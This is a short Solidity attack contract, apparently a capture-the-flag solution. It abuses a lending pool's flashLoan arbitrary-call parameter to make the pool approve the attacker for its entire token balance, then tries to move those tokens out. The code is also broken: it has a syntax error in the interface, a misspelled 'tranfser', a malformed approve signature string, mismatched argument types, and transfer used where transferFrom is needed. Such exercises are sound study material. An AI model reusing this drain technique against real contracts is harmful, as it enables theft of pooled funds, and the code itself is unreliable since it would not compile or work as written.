pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data;
    );
}

contract TrusterAttack {
    using Address for address payable;
  
    constructor(address payable poolAddress,
                 
                IERC20 tokenAddress)
    {
        //Idea
        //call flashLoan with x borrowAmount, borrower = this
        //target = token 
        uint256 balance = tokenAddress.balanceOf(poolAddress);
        IPoolFunc(poolAddress).flashLoan(
            0,
            address(this),
            tokenAddress,
            abi.encodeWithSignature(
                "approve(address , uint256) ",
                address(this),
                balance
            )
        );
        tokenAddress.tranfser(msg.sender, balance);
        //calldata = approve(pool, this)
        //response 
        //token.tranfser(amount,attacker)
        //
    }

   
}